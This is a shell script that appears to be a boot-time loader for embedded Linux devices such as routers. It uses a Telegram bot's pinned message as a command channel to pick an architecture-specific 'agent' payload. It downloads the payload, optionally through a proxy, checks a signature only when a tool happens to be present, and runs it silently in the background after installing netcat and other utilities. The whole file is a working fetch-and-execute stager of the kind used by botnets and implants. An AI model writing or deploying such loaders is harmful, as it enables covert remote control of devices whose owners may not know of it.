#!/bin/sh
set -u
AS='agent ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA89wLNtPn641ZPT10xYSGEgD7Hca4JKJNzwAcuNy4Qj agent'
exec >>/tmp/boot.log 2>&1
T="${1:-}"; C="${2:-}"
if [ -z "$T" ] || [ -z "$C" ]; then
  T=$(sed -n 's/^TOK=//p' /root/a.env 2>/dev/null)
  C=$(sed -n 's/^CHAT=//p' /root/a.env 2>/dev/null)
fi
if [ -z "$T" ] || [ -z "$C" ]; then echo "usage: boot.sh TOKEN CHAT"; exit 1; fi
if command -v opkg >/dev/null 2>&1; then
  if ! command -v curl >/dev/null 2>&1 || ! command -v base64 >/dev/null 2>&1 || ! command -v nc >/dev/null 2>&1 || ! command -v openssl >/dev/null 2>&1; then
    opkg update >/dev/null 2>&1
    opkg install curl ca-bundle coreutils-base64 netcat openssl-util openssh-keygen openssh-client >/dev/null 2>&1
  fi
fi
PX=$(sed -n '1p' /root/proxies.txt 2>/dev/null)
API="https://api.telegram.org/bot$T"
dl(){ for p in "" "$PX"; do
  if [ -n "$p" ]; then
    curl -fsSk -m 25 -x "$p" "$1" -o "$2" && return 0
    https_proxy="$p" http_proxy="$p" wget -q -T 25 -O "$2" "$1" && return 0
  else
    curl -fsSk -m 25 "$1" -o "$2" && return 0
    wget -q -T 25 -O "$2" "$1" && return 0
  fi; done; return 1; }
A=$(uname -m)
case "$A" in
 x86_64|amd64) A=x86_64;; aarch64|arm64) A=aarch64;;
 armv7*|armv6*) A=armv7l;; armv5*|armv4*) A=armv5;;
 mips64*) A=mips;; mips*) case "$A" in *el) A=mipsel;; *) A=mips;; esac;;
 ppc64*) A=ppc64;; ppc*) A=ppc;; i?86) A=i686;; *) A=x86_64;; esac
dl "$API/getChat?chat_id=$C" /tmp/pin.json || { echo no_pin; exit 2; }
TXT=$(sed -n 's/.*"pinned_message":{.*"text":"\([^"]*\)".*/\1/p' /tmp/pin.json | sed 's/\\n/\n/g')
FID=$(printf '%s\n' "$TXT" | sed -n "s/^agent_$A=//p" | head -1)
SIG=$(printf '%s\n' "$TXT" | sed -n 's/^sig=//p' | head -1)
[ -z "$FID" ] && { echo "no_agent_$A"; exit 3; }
[ -z "$SIG" ] && { echo no_sig; exit 7; }
dl "$API/getFile?file_id=$FID" /tmp/f.json || { echo no_file; exit 4; }
FP=$(sed -n 's/.*"file_path":"\([^"]*\)".*/\1/p' /tmp/f.json)
[ -z "$FP" ] && { echo no_path; exit 5; }
dl "https://api.telegram.org/file/bot$T/$FP" /tmp/a.sh || { echo dl_fail; exit 6; }
if command -v ssh-keygen >/dev/null 2>&1; then
  if ssh-keygen -Y verify 2>&1 | grep -q unrecognized; then
    echo no_ykeygen
  else
    printf '%s' "$SIG" | base64 -d > /tmp/a.sig 2>/dev/null
    printf '%s\n' "$AS" > /tmp/as
    ssh-keygen -Y verify -f /tmp/as -I agent -n agent -s /tmp/a.sig < /tmp/a.sh >/dev/null 2>&1 || { echo bad_sig; exit 7; }
  fi
else
  echo no_sshkeygen
fi
sh -n /tmp/a.sh || { echo syntax; exit 8; }
cp /tmp/a.sh /tmp/agent.sh; chmod +x /tmp/agent.sh
if command -v start-stop-daemon >/dev/null 2>&1; then
  start-stop-daemon -S -b -x /tmp/agent.sh -- "$T" "$C"
else
  ( /tmp/agent.sh "$T" "$C" >>/tmp/agent.log 2>&1 </dev/null & )
fi
echo started
